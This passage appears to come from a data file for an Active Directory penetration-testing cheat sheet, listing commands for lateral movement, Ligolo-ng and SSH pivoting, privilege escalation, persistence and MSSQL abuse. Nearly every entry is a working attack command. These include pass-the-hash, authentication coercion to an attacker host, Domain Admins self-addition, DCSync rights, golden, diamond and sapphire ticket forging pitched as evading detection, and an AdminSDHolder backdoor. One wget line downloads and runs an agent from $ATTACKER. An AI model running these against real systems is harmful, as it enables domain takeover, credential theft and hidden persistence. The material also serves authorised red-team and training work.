    useCase: "Lateral movement to any WinRM-enabled host when the current session already has PowerShell available and you'd rather not stage evil-winrm.",
  },
  {
    id: "invoke-command-fanout",
    tool: "PowerShell Remoting",
    phase: "lateral",
    title: "Run a command across many hosts at once",
    command: "Invoke-Command -ScriptBlock {whoami} -ComputerName (Get-Content hosts.txt)",
    description: "Fans a scriptblock out to every host in a list in parallel over WinRM and collects the results — the native-PowerShell equivalent of nxc's mass-execution model, useful when nxc isn't staged but PowerShell already is.",
    useCase: "Quick domain-wide sweep (e.g. checking local admin group membership, running a recon script) from an existing PowerShell foothold with credentials for a target list.",
  },
  {
    id: "xfreerdp",
    tool: "xfreerdp",
    phase: "lateral",
    title: "RDP session with drive mapping and cert bypass",
    command: "xfreerdp /u:$USER /p:$PASS /d:$DOMAIN /v:$TARGET /cert:ignore /drive:share,/tmp /dynamic-resolution",
    description: "Opens a full interactive RDP session from Linux — /cert:ignore skips the self-signed certificate warning almost every internal RDP host throws, and /drive maps a local folder into the session for easy file transfer.",
    useCase: "Interactive GUI access when a shell alone isn't enough — recovering saved credentials from an open app, using GUI-only admin tools, or just visually confirming what a compromised account can actually see.",
  },
  {
    id: "pth-mimikatz",
    tool: "Mimikatz",
    phase: "lateral",
    title: "Pass-the-hash",
    command: "sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$HASH /run:cmd.exe",
    description: "Spawns a process with an injected NTLM hash, authenticating as that user without knowing the plaintext password.",
    useCase: "Using a dumped NTLM hash directly for lateral movement instead of cracking it first.",
  },
  {
    id: "rbcd",
    tool: "Impacket (rbcd.py)",
    phase: "lateral",
    title: "Resource-Based Constrained Delegation abuse",
    command: "rbcd.py -delegate-to 'TARGET$' -delegate-from 'ATTACKER$' -action write $DOMAIN/$USER:$PASS",
    description: "If you control an object with write access to a target's msDS-AllowedToActOnBehalfOfOtherIdentity attribute, you can grant yourself delegation rights to impersonate any user on that target.",
    useCase: "Common privilege-escalation-to-lateral-movement chain when a computer account has write rights over another.",
  },

  // --- Pivoting: Ligolo-ng ---
  {
    id: "ligolo-apt-install",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Install via apt (Kali)",
    command: "sudo apt install ligolo-ng",
    description: "Kali ships Ligolo-ng as a standard repo package, installing both the `proxy` and `agent` binaries system-wide — no manual Go build or GitHub release download needed.",
    useCase: "Fastest way to get both binaries ready on a Kali attack box; run `ligolo-ng-proxy` / `ligolo-ng-agent` (or `proxy`/`agent` depending on version) once installed.",
  },
  {
    id: "ligolo-proxy-start",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Start the proxy server (attacker side)",
    command: "./proxy -selfcert -laddr 0.0.0.0:11601",
    description: "Runs the Ligolo-ng operator console, which listens for agent connections and creates a TUN interface for routing traffic into the target network.",
    useCase: "First step on any Ligolo-ng pivot — run this once on your attack box before deploying any agents.",
  },
  {
    id: "ligolo-agent-connect",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Connect an agent from a compromised host",
    command: "./agent -connect $ATTACKER:11601 -ignore-cert",
    description: "Runs the lightweight Ligolo-ng agent binary on a foothold host, which dials back to the proxy and becomes a pivot point — no admin/driver install needed since it works entirely in userspace.",
    useCase: "Deploying a pivot point on a compromised workstation or server to reach networks it can see but you can't.",
  },
  {
    id: "ligolo-agent-deliver",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Download and launch the agent on a fresh foothold",
    command: "wget http://$ATTACKER/agent && chmod +x agent && ./agent -connect $ATTACKER:11601 --ignore-cert",
    description: "Pulls the pre-built agent binary onto a newly compromised host from a simple web server on your attack box (e.g. `python3 -m http.server` in the same directory as the agent binary), makes it executable, then connects it back to the proxy in one line.",
    useCase: "Standard delivery method the moment you land on a new host and the agent binary isn't already there — copy this straight into a shell you just popped.",
  },
  {
    id: "ligolo-tun-setup",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Create and bring up the tun interface",
    command: "sudo ip tuntap add user $(whoami) mode tun ligolo && sudo ip link set ligolo up",
    description: "Creates the local TUN device that Ligolo-ng routes traffic through once a session is selected and started.",
    useCase: "One-time setup on the attack box before the first tunnel/start commands work.",
  },
  {
    id: "ligolo-ifcreate",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Create a named tunnel interface",
    command: "ifcreate --name dead-drop",
    description: "Inside the proxy console, creates a custom-named TUN interface instead of the default one — lets you keep multiple simultaneous pivots on separate, clearly labeled interfaces.",
    useCase: "Running several pivots at once (different footholds, different target networks) without their routes colliding on one interface.",
  },
  {
    id: "ligolo-route-add",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Route a target subnet through the tunnel",
    command: "sudo ip route add $TARGET/24 dev ligolo",
    description: "Adds a route sending traffic for the pivot-side subnet through the Ligolo-ng TUN interface instead of your normal network path.",
    useCase: "Making tools like nmap/nxc/impacket reach hosts on a segmented internal network as if you were on it directly, no proxychains needed.",
  },
  {
    id: "ligolo-route-host-cidr",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Route individual hosts (avoid same-subnet loops)",
    command: "route_add --name dead-drop --route $TARGET/32",
    description: "Adds a route for one specific host (/32) instead of the whole subnet. Necessary when your attacker box is already on the same network segment as the targets — routing the entire /24 back through the tunnel would create a routing loop back to yourself.",
    useCase: "Pivoting to specific hosts you've already identified (e.g. via prior nmap sweep) on a network you're partially connected to, one route per host, without breaking your own routing table. Run once per identified target IP.",
  },
  {
    id: "ligolo-session-start",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Select an agent and start relaying",
    command: "session\nstart",
    description: "Inside the proxy console: `session` lists/selects a connected agent, `start` begins forwarding traffic for the routes you've added through it.",
    useCase: "Activating the tunnel once an agent has checked in and routes are configured.",
  },
  {
    id: "ligolo-listener-add",
    tool: "Ligolo-ng",
    phase: "pivot",
    title: "Add a reverse listener on the agent side",
    command: "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp",
    description: "Binds a port on the agent (deep in the pivot network) and forwards connections back to your attack box — the reverse of the usual tunnel direction.",
    useCase: "Catching a reverse shell or callback from a host that can only reach the pivot box, not your attacker IP directly.",
  },

  // --- Pivoting: SSH ---
  {
    id: "ssh-dynamic-socks",
    tool: "SSH",
    phase: "pivot",
    title: "Dynamic SOCKS proxy (-D)",
    command: "ssh -D 1080 -N $USER@$TARGET",
    description: "Turns the SSH connection into a SOCKS5 proxy on local port 1080 — any tool that supports SOCKS (or is run through proxychains) can then reach the far side of that SSH box.",
    useCase: "The most flexible pivot method — pair with proxychains to run nxc, impacket, or a browser through a single compromised SSH host.",
  },
  {
    id: "ssh-local-forward",
    tool: "SSH",
    phase: "pivot",
    title: "Local port forward (-L)",
    command: "ssh -L 8080:$TARGET:80 $USER@$TARGET",
    description: "Forwards a port on your local machine to a specific destination reachable from the SSH server, without needing a full SOCKS proxy.",
    useCase: "Reaching one specific internal service (e.g. an internal web app) through a single SSH hop with minimal setup.",
  },
  {
    id: "ssh-remote-forward",
    tool: "SSH",
    phase: "pivot",
    title: "Remote port forward (-R)",
    command: "ssh -R 4444:127.0.0.1:4444 $USER@$ATTACKER",
    description: "Forwards a port from the remote SSH server back to your local machine — the reverse direction of -L.",
    useCase: "Exposing a listener on your attack box to a host that has outbound SSH access to you but is otherwise firewalled off.",
  },
  {
    id: "ssh-jump-host",
    tool: "SSH",
    phase: "pivot",
    title: "Multi-hop via ProxyJump (-J)",
    command: "ssh -J $USER@$TARGET $USER@$TARGETOBJECT",
    description: "Chains through one or more intermediate SSH hosts to reach a final destination in a single command, without manually nesting SSH sessions.",
    useCase: "Cleanly reaching a third-tier host through a chain of jump boxes instead of SSH-ing into each hop by hand.",
  },
  {
    id: "ssh-proxychains",
    tool: "proxychains + SSH",
    phase: "pivot",
    title: "Route any tool through an SSH SOCKS proxy",
    command: "proxychains nxc smb $TARGET -u $USER -p $PASS",
    description: "Wraps a non-proxy-aware tool's network calls through the SOCKS proxy set up by `ssh -D`, so it transparently routes through the pivot.",
    useCase: "Running your existing enumeration/exploitation tools (nxc, impacket, etc.) against hosts only reachable through the SSH pivot.",
  },

  // ============ PRIVILEGE ESCALATION ============
  {
    id: "bloodhound-paths",
    tool: "BloodHound",
    phase: "privesc",
    title: "Query shortest path to Domain Admins",
    command: "MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:'DOMAIN ADMINS@CORP.LOCAL'})) RETURN p",
    description: "Cypher query against the BloodHound graph database to find the shortest ACL/session/membership path to a high-value target.",
    useCase: "Turning raw SharpHound/bloodhound-python collection data into a concrete escalation plan.",
  },
  {
    id: "petitpotam",
    tool: "PetitPotam",
    phase: "privesc",
    title: "Coerce DC authentication (MS-EFSRPC)",
    command: "python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC",
    description: "Forces a target (often a domain controller) to authenticate to an attacker-controlled listener, typically relayed into ADCS enrollment.",
    useCase: "Combine with ntlmrelayx and Certipy to relay DC machine-account auth into a certificate = domain compromise.",
  },
  {
    id: "nopac",
    tool: "noPac",
    phase: "privesc",
    title: "sAMAccountName spoofing (CVE-2021-42287/42278)",
    command: "python3 noPac.py $DOMAIN/$USER:$PASS -dc-ip $DC -dc-host $DC --impersonate administrator -use-ldap",
    description: "Exploits a gap between sAMAccountName validation and Kerberos ticket issuance to impersonate a domain controller.",
    useCase: "Direct path to Domain Admin on unpatched domains — check patch level before use.",
  },
  {
    id: "printerbug-coerce",
    tool: "Rubeus / SpoolSample",
    phase: "privesc",
    title: "PrinterBug — coerce authentication via Print Spooler (MS-RPRN)",
    command: "SpoolSample.exe $DC $ATTACKER",
    description: "Abuses the MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) call to force a machine with an exposed spooler service to authenticate to an attacker host — a coercion primitive, not to be confused with PrintNightmare (a separate, RCE-yielding spooler vulnerability covered elsewhere).",
    useCase: "Same coercion pattern as PetitPotam — useful when EFSRPC is patched but the spooler isn't locked down. Commonly chained straight into an NTLM/Kerberos relay.",
  },
  {
    id: "unconstrained-deleg",
    tool: "Rubeus",
    phase: "privesc",
    title: "Harvest TGTs from unconstrained delegation host",
    command: "Rubeus.exe monitor /interval:5 /filteruser:administrator",
    description: "On a host trusted for unconstrained delegation, incoming TGTs get cached and can be extracted when a privileged account connects.",
    useCase: "Sit on a print-server or similar unconstrained-delegation box and wait for a Domain Admin session.",
  },
  {
    id: "bloodyad-genericall-group",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Add yourself to a privileged group",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add groupMember 'Domain Admins' $USER",
    description: "Adds a principal to a target group if you hold GenericAll/GenericWrite/WriteMember rights on that group.",
    useCase: "Directly escalating to Domain Admin membership when BloodHound shows a write path onto that group.",
  },
  {
    id: "bloodyad-dcsync-rights",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Grant yourself DCSync rights",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add dcsync $USER",
    description: "Writes the DS-Replication-Get-Changes and Get-Changes-All ACEs onto the domain object for your account.",
    useCase: "When you hold GenericAll/WriteDacl on the domain object itself — grants full DCSync capability without touching group membership.",
  },
  {
    id: "bloodyad-add-computer",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Add a computer account (machine quota)",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add computer 'ATTACKERPC' 'Passw0rd!'",
    description: "Creates a new computer object using the default MachineAccountQuota (usually 10) that any authenticated domain user gets by default.",
    useCase: "Getting a machine account under your control for RBCD abuse or as a foothold identity that isn't tied to a human user.",
  },
  {
    id: "bloodyad-owner",
    tool: "bloodyAD",
    phase: "privesc",
    title: "Take ownership of an object",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set owner $TARGETOBJECT $USER",
    description: "Changes the owner of an AD object if you hold WriteOwner rights — ownership then lets you grant yourself further rights (e.g. GenericAll) on it.",
    useCase: "First step in a WriteOwner abuse chain when you don't yet have direct write rights on the object itself.",
  },
  {
    id: "nxc-ldap-signing",
    tool: "NetExec (nxc)",
    phase: "privesc",
    title: "Check LDAP signing / channel binding",
    command: "nxc ldap $DC -u $USER -p $PASS -M ldap-checker",
    description: "Checks whether LDAP signing and channel binding are enforced — if not, relay attacks into LDAP become viable.",
    useCase: "Deciding whether an NTLM-relay-to-LDAP privesc chain (e.g. with ntlmrelayx) is possible.",
  },

  // ============ PERSISTENCE ============
  {
    id: "golden-ticket",
    tool: "Mimikatz",
    phase: "persist",
    title: "Golden ticket",
    command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /krbtgt:$HASH /ptt",
    description: "Forges a TGT signed with the krbtgt hash, granting domain-wide access as any user, valid until the krbtgt password is rotated (twice).",
    useCase: "Long-term persistence after a full domain compromise — requires the krbtgt hash from a prior DCSync.",
  },
  {
    id: "impacket-ticketer",
    tool: "Impacket (ticketer.py)",
    phase: "persist",
    title: "Forge golden/silver ticket from Linux",
    command: "ticketer.py -nthash $HASH -domain-sid $SID -domain $DOMAIN administrator",
    description: "Python/Impacket equivalent of Mimikatz's golden ticket forging — creates a .ccache file usable with other Impacket tools.",
    useCase: "Forging tickets from a Linux attack host without needing Mimikatz on Windows.",
  },
  {
    id: "impacket-ticketer-request-diamond",
    tool: "Impacket (ticketer.py)",
    phase: "persist",
    title: "Diamond ticket from Linux (ticketer.py -request)",
    command: "ticketer.py -request -domain $DOMAIN -user $USER -password $PASS -nthash $HASH -domain-sid $SID -user-id 500 -groups 512 $USER",
    description: "The Linux/Impacket equivalent of a Rubeus diamond ticket — -request performs a real AS-REQ for the account you already hold credentials for ($USER), then re-signs that genuinely KDC-issued ticket's PAC with the krbtgt hash to inject Domain Admins-level group membership, instead of forging the whole ticket offline.",
    useCase: "Same detection-evasion value as Rubeus's diamond ticket (dodges golden-ticket fingerprints like offline construction and mismatched logon events), but from a Linux attack host with no Rubeus/Windows execution needed.",
  },
  {
    id: "impacket-ticketer-request-sapphire",
    tool: "Impacket (ticketer.py)",
    phase: "persist",
    title: "Sapphire ticket from Linux (ticketer.py -request -impersonate)",
    command: "ticketer.py -request -impersonate administrator -domain $DOMAIN -user $USER -password $PASS -nthash $HASH -domain-sid $SID -user-id 500 administrator",
    description: "Adding -impersonate to -request drives a genuine S4U2Self round-trip through the KDC as the impersonated target user, pulling back that user's real, KDC-built PAC instead of hand-editing group/RID fields yourself — the same detection-resistance idea as a Sapphire ticket, from an Impacket/Linux host instead of SapphireTicket.exe.",
    useCase: "Closing the same PAC-inconsistency gaps a plain diamond ticket leaves behind, without needing a Windows host or the standalone Sapphire Ticket tool at all.",
  },
  {
    id: "silver-ticket",
    tool: "Mimikatz",
    phase: "persist",
    title: "Silver ticket",
    command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /target:$DC /service:cifs /rc4:$HASH /ptt",
    description: "Forges a TGS for a specific service using that service account's hash, without touching the DC or krbtgt.",
    useCase: "Quieter and more targeted than a golden ticket — access to one specific service, harder to detect.",
  },
  {
    id: "sapphire-ticket",
    tool: "Sapphire Ticket",
    phase: "persist",
    title: "Sapphire ticket",
    command: "SapphireTicket.exe /krbtgt:$HASH /domain:$DOMAIN /dc:$DC /ticketuser:administrator /ticketuserid:500 /groups:512",
    description: "Extends the Diamond Ticket technique by performing an S4U2self round-trip against the KDC to obtain a fully legitimate PAC for the target identity before splicing it into the forged ticket — closing the PAC-inconsistency gaps that Diamond Tickets still leave behind.",
    useCase: "The most detection-resistant public ticket-forging technique — specifically defeats PAC-validation-based detections built to catch Golden/Diamond tickets.",
  },
  {
    id: "adminsdholder",
    tool: "PowerView / ActiveDirectory module",
    phase: "persist",
    title: "AdminSDHolder ACL backdoor",
    command: "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity $USER -Rights All",
    description: "AdminSDHolder's ACL is periodically re-applied to all protected (admin) groups by SDProp — planting a backdoor ACE here propagates it to every privileged account.",
    useCase: "Stealthy persistence that survives normal password rotations and even some ACL cleanups.",
  },
  {
    id: "dsrm",
    tool: "reg / Mimikatz",
    phase: "persist",
    title: "DSRM account persistence",
    command: "reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive",
    description: "The Directory Services Restore Mode local administrator account on a DC can be used as a logon identity if its hash is captured and the logon behavior is enabled.",
    useCase: "Backup persistence path on a DC that doesn't rely on domain accounts at all.",
  },

  // ============ DEFENSE EVASION ============
  {
    id: "amsi-bypass-note",
    tool: "AMSI awareness",
    phase: "evasion",
    title: "Understand AMSI scan points",
    command: "# Reference only: AMSI hooks PowerShell, VBA, and JScript at runtime string level",
    description: "AMSI inspects script content before execution; tooling that avoids common flagged strings or uses compiled binaries instead of scripts reduces detections.",
    useCase: "Context for why many tools ship as compiled .NET (Rubeus, SharpHound) rather than PowerShell scripts.",
  },
  {
    id: "clm-check",
    tool: "PowerShell",
    phase: "evasion",
    title: "Check for Constrained Language Mode",
    command: "$ExecutionContext.SessionState.LanguageMode",
    description: "Returns FullLanguage or ConstrainedLanguage — the latter blocks most offensive PowerShell tradecraft.",
    useCase: "Quick check before deciding whether to lean on PowerShell tooling or fall back to compiled binaries.",
  },
  {
    id: "nxc-obfuscate",
    tool: "NetExec (nxc)",
    phase: "evasion",
    title: "Reduce authentication noise",
    command: "nxc smb $TARGET -u $USER -p $PASS --no-bruteforce --continue-on-success",
    description: "Limits nxc to single, deliberate auth attempts per host instead of hammering multiple hosts/creds at once.",
    useCase: "Keeping validation checks quieter in environments with active alerting on repeated auth failures.",
  },
  {
    id: "log-clear-note",
    tool: "Event log awareness",
    phase: "evasion",
    title: "Know what generates 4624/4625/4768/4769",
    command: "# Reference only: map actions to Windows Security Event IDs before running them",
    description: "Kerberoasting generates 4769, failed spray attempts generate 4625, DCSync-style replication generates 4662 — understanding this shapes noisy vs quiet technique choice.",
    useCase: "Planning which techniques are viable in an environment with active SOC monitoring.",
  },

  // ============ MSSQL ============
  {
    id: "mssql-login-windows",
    tool: "Impacket (mssqlclient.py)",
    phase: "recon",
    title: "Login with Windows/domain auth",
    command: "mssqlclient.py $DOMAIN/$USER:$PASS@$TARGET -windows-auth",
    description: "Connects to a MSSQL instance using domain credentials, dropping you into an interactive SQL shell.",
    useCase: "Standard first step whenever nxc/BloodHound shows a domain account has SQL Server access.",
  },
  {
    id: "mssql-login-sql-auth",
    tool: "Impacket (mssqlclient.py)",
    phase: "recon",
    title: "Login with SQL authentication",
    command: "mssqlclient.py $USER:$PASS@$TARGET",
    description: "Connects using a native SQL Server login instead of a domain account — omit -windows-auth for local SQL auth accounts like sa.",
    useCase: "When you've found SQL Server credentials that aren't tied to an AD account (e.g. sa, or an app's local SQL login).",
  },
  {
    id: "mssql-login-hash",
    tool: "Impacket (mssqlclient.py)",
    phase: "recon",
    title: "Login with pass-the-hash",
    command: "mssqlclient.py $DOMAIN/$USER@$TARGET -hashes :$HASH -windows-auth",
    description: "Authenticates to MSSQL using an NTLM hash instead of a plaintext password.",
    useCase: "Chaining a previously dumped hash straight into SQL Server access without cracking it.",
  },
  {
    id: "nxc-mssql-check",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Validate creds / find SQL admins across hosts",
    command: "nxc mssql $TARGET -u $USER -p $PASS",
    description: "Checks a credential against MSSQL on every host in scope and flags whether it's a sysadmin on each instance.",
    useCase: "Fast triage across a subnet to find which SQL Server instances a credential can reach and with what privilege.",
  },
  {
    id: "mssql-whoami",
    tool: "MSSQL (T-SQL)",
    phase: "recon",
    title: "Check current login and privilege level",
    command: "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');",
    description: "Shows which SQL login you're authenticated as and whether it holds the sysadmin server role — sysadmin is required for most of the abuse below.",
    useCase: "First command to run once connected, to know what's actually possible from this login.",
  },
  {
    id: "mssql-enable-xpcmdshell",
    tool: "MSSQL (T-SQL)",
    phase: "privesc",
    title: "Enable xp_cmdshell",
    command: "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
    description: "xp_cmdshell is disabled by default but re-enableable by any sysadmin login — it runs OS commands with the privileges of the SQL Server service account.",
    useCase: "Required one-time step before xp_cmdshell will execute anything, if it isn't already enabled.",
  },
  {
    id: "mssql-xpcmdshell-exec",
    tool: "MSSQL (T-SQL)",
    phase: "lateral",
    title: "Execute OS commands via xp_cmdshell",
    command: "EXEC xp_cmdshell 'whoami';",
    description: "Runs an arbitrary command on the underlying Windows host through the SQL Server service account context.",
    useCase: "Turning SQL sysadmin access into OS-level command execution — often lands SYSTEM if the service runs as such.",
  },
  {
    id: "nxc-mssql-exec",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Execute a command via MSSQL in one line",
    command: "nxc mssql $TARGET -u $USER -p $PASS -x \"whoami\"",
    description: "Wraps the xp_cmdshell enable + execute + disable cycle into a single command instead of doing it manually in mssqlclient.",
    useCase: "Quick one-off command execution without an interactive SQL session.",
  },
  {
    id: "mssql-linked-servers",
    tool: "MSSQL (T-SQL)",
    phase: "recon",
    title: "Enumerate linked servers",
    command: "EXEC sp_linkedservers;",
    description: "Lists other SQL Server instances this server is configured to trust and query directly, sometimes across domain/forest boundaries.",
    useCase: "Finding a chain of trusted SQL servers that can be walked for further access, especially useful when the current server has limited value.",
  },
  {
    id: "mssql-linked-query",
    tool: "MSSQL (T-SQL)",
    phase: "lateral",
    title: "Query a linked server",
    command: "SELECT * FROM OPENQUERY(\"LINKEDSERVER\", 'select @@version, system_user');",
    description: "Runs a query against a linked server using its own configured trust — often executes with more privilege on the far side than you have locally.",
    useCase: "Confirming what a linked server trust actually grants before chaining a full command execution through it.",
  },
  {
    id: "mssql-linked-xpcmdshell",
    tool: "MSSQL (T-SQL)",
    phase: "lateral",
    title: "Command execution through a linked server chain",
    command: "EXEC ('EXEC xp_cmdshell ''whoami''') AT [LINKEDSERVER];",
    description: "Pivots xp_cmdshell execution through a linked server, running the command on the linked instance's host instead of the one you're directly connected to.",
    useCase: "Classic MSSQL lateral movement chain — hop across trusted SQL servers, sometimes reaching hosts unreachable by SMB/WinRM directly.",
  },
  {
    id: "mssql-xpdirtree-coerce",
    tool: "MSSQL (T-SQL)",
    phase: "cred",
    title: "Coerce NetNTLM auth via xp_dirtree",
    command: "EXEC master..xp_dirtree '\\\\$ATTACKER\\share\\';",
    description: "Forces the SQL Server service account to authenticate to an attacker-controlled UNC path, leaking a NetNTLM hash that can be captured (e.g. with Responder) or relayed.",
    useCase: "Capturing or relaying the SQL Server service account's credentials without needing xp_cmdshell at all — works even from a lower-privilege login in some configs.",
  },

  // ============ ADDITIONAL DISCOVERY / ASSESSMENT ============
  {
    id: "pingcastle",
    tool: "PingCastle",
    phase: "recon",
    title: "Run a full AD risk assessment",
    command: "PingCastle.exe --healthcheck --server $DC",
    description: "Scores the domain across categories (stale objects, privileged accounts, trusts, anomalies) and produces a risk report with a letter grade.",
    useCase: "Fast way to surface low-hanging misconfigurations across an entire domain without manual enumeration.",
  },
  {
    id: "adrecon",
    tool: "ADRecon",
    phase: "recon",
    title: "Export a full AD inventory report",
    command: "Invoke-ADRecon.ps1 -DomainController $DC -Credential $DOMAIN\\$USER",
    description: "Dumps users, groups, computers, GPOs, ACLs, trusts and password policy into a single Excel/CSV report.",
    useCase: "Building a comprehensive offline inventory of the domain to review without repeatedly hitting the DC.",
  },
  {
    id: "adexplorer-snapshot",
    tool: "AD Explorer",
    phase: "recon",
    title: "Take a snapshot of the directory",
    command: "AdExplorer.exe -snapshot $DOMAIN C:\\adexplorer_$DOMAIN.dat",
    description: "SysInternals GUI tool that connects to a DC and saves the entire directory (objects, attributes, schema, security descriptors) as a single offline .dat snapshot.",
    useCase: "Grabbing a full offline copy of AD to browse or diff later without repeated authenticated queries against the live DC.",
  },
  {
    id: "adexplorer-compare",
    tool: "AD Explorer",
    phase: "recon",
    title: "Diff two snapshots for changes",
    command: "AdExplorer.exe -compare snapshot1.dat snapshot2.dat",
    description: "Compares two saved snapshots and highlights every object/attribute added, removed, or modified between them — permissions, group membership, GPO links included.",
    useCase: "Spotting privilege escalation or persistence changes (new group members, modified ACLs) made between two points in time, e.g. before/after an attack or over an engagement.",
  },

  // ============ POWERVIEW ============
  {
    id: "powerview-get-netdomain",
    tool: "PowerView",
    phase: "recon",
    title: "Get current domain information",
    command: "Get-NetDomain",
    description: "Returns basic information about the current domain — name, domain controllers, policy — the PowerView starting point most other PowerView enumeration builds on.",
    useCase: "First command run after landing on a domain-joined host with PowerView loaded, to confirm domain context.",
  },
  {
    id: "powerview-get-netdomaincontroller",
    tool: "PowerView",
    phase: "recon",
    title: "Enumerate domain controllers",
    command: "Get-NetDomainController",
    description: "Lists every domain controller in the current domain with their hostnames and IPs.",
    useCase: "Confirming which hosts are DCs before targeting DCSync, ADCS, or other DC-specific attacks.",
  },
  {
    id: "powerview-get-netuser",
    tool: "PowerView",
    phase: "recon",
    title: "List domain users with detailed attributes",
    command: "Get-NetUser",
    description: "Dumps every domain user object with its full attribute set — a PowerShell-native alternative to LDAP tools like ldapsearch or bloodyAD for browsing raw user attributes.",
    useCase: "Ad-hoc attribute browsing (description fields, UAC flags, SPNs) when you don't want to set up a full BloodHound collection first.",
  },
  {
    id: "powerview-get-netuser-admincount",
    tool: "PowerView",
    phase: "recon",
    title: "Find high-value (AdminCount=1) users",
    command: "Get-NetUser -AdminCount 1",
    description: "Filters to users flagged AdminCount=1 — accounts that are or were members of a protected group (AdminSDHolder-covered), so still worth targeting even if not currently in Domain Admins.",
    useCase: "Fast shortlist of historically-privileged accounts, including ones since removed from their original group but still carrying the protected ACL.",
  },
  {
    id: "powerview-get-netgroupmember",
    tool: "PowerView",
    phase: "recon",
    title: "List members of a privileged group",
    command: "Get-NetGroupMember -GroupName 'Domain Admins'",
    description: "Resolves every member of a specified group, recursing into nested groups — swap the group name for Enterprise Admins, Backup Operators, DnsAdmins, etc.",
    useCase: "Confirming exactly who holds a privileged group's rights before planning an escalation path toward them.",
  },
  {
    id: "powerview-get-netcomputer",
    tool: "PowerView",
    phase: "recon",
    title: "Enumerate domain computers",
    command: "Get-NetComputer",
    description: "Lists every computer object in the domain, with OS version and other attributes — useful for spotting unpatched/legacy servers worth targeting first.",
    useCase: "Building a target list of domain-joined hosts, filterable by OS/service pack for known-vulnerable candidates.",
  },
  {
    id: "powerview-get-domainobjectacl",
    tool: "PowerView",
    phase: "recon",
    title: "Get the ACL on a specific AD object",
    command: "Get-DomainObjectAcl -SamAccountName $USER -ResolveGUIDs",
    description: "Dumps every ACE on the target object's DACL, resolving extended-rights GUIDs to human-readable names (e.g. 'DS-Replication-Get-Changes' instead of a bare GUID).",
    useCase: "Checking exactly what rights a specific principal has over a specific object — the PowerShell-native equivalent of Impacket's dacledit.py in read mode.",
  },
  {
    id: "powerview-find-interestingdomainacl",
    tool: "PowerView",
    phase: "recon",
    title: "Search the whole domain for abusable ACEs",
    command: "Find-InterestingDomainAcl -ResolveGUIDs",
    description: "Scans every object's DACL domain-wide and flags ACEs granting rights outside the default/expected set — GenericAll, GenericWrite, WriteOwner, and similar, held by non-default principals.",
    useCase: "The PowerShell-native equivalent of loading a domain into BloodHound and browsing ACL-abuse edges, useful when BloodHound collection isn't an option.",
  },
  {
    id: "powerview-get-domaingpo",
    tool: "PowerView",
    phase: "recon",
    title: "Enumerate GPOs in the domain",
    command: "Get-DomainGPO | select displayname",
    description: "Lists every Group Policy Object in the domain by name — the starting point before checking which ones are misconfigured or whose linked computers/users you can already write to.",
    useCase: "Building a GPO inventory before running Get-DomainGPOLocalGroup or checking individual GPOs' own ACLs for write access.",
  },
  {
    id: "powerview-get-domaingpolocalgroup",
    tool: "PowerView",
    phase: "recon",
    title: "Find GPOs that grant local group membership",
    command: "Get-DomainGPOLocalGroup",
    description: "Finds GPOs that use Restricted Groups or Group Policy Preferences to add users to a local group (e.g. local Administrators) on the computers/OUs they're linked to.",
    useCase: "Identifying which GPO to target for the GPO abuse chain, and which computers a GPO-granted local admin right already reaches.",
  },
  {
    id: "powerview-get-domainou",
    tool: "PowerView",
    phase: "recon",
    title: "Enumerate organizational units",
    command: "Get-DomainOU",
    description: "Lists every OU in the domain — combine with -Identity to pull a specific OU's distinguishedName/gplink, needed to trace which GPOs apply to it.",
    useCase: "Mapping the OU structure before a GPO or Create-Child (dMSA/BadSuccessor) abuse, to know exactly which computers/accounts a given OU covers.",
  },
  {
    id: "powerview-get-domaintrust",
    tool: "PowerView",
    phase: "recon",
    title: "Enumerate domain/forest trusts",
    command: "Get-DomainTrust",
    description: "Lists every trust relationship the current domain has, including direction and SID-filtering status — the two things that determine whether a trust is actually abusable.",
    useCase: "Scoping out cross-domain/cross-forest escalation potential before running the Trust Abuse chain.",
  },
  {
    id: "powerview-get-forest",
    tool: "PowerView",
    phase: "recon",
    title: "Get forest information",
    command: "Get-Forest",
    description: "Returns forest-level details — root domain, functional level, global catalogs — one level up from Get-NetDomain's single-domain scope.",
    useCase: "Understanding the full forest topology (multiple domains, forest trusts) before planning an escalation path that crosses domain boundaries.",
  },

  // ============ SESSION / SHARE HUNTING ============
  {
    id: "powerview-find-localadminaccess",
    tool: "PowerView",
    phase: "recon",
    title: "Find every machine the current user admins",
    command: "Find-LocalAdminAccess -Verbose",
    description: "Sweeps the domain checking where the current user's token grants local admin — a live network check rather than a BloodHound-graph inference, so it reflects actual current access.",
    useCase: "Quick lateral-movement target list from the account you're currently running as, without needing a prior BloodHound collection.",
  },
  {
    id: "powerview-find-domainuserlocation",
    tool: "PowerView",
    phase: "recon",
    title: "Find where a privileged user has a session",
    command: "Find-DomainUserLocation -Verbose",
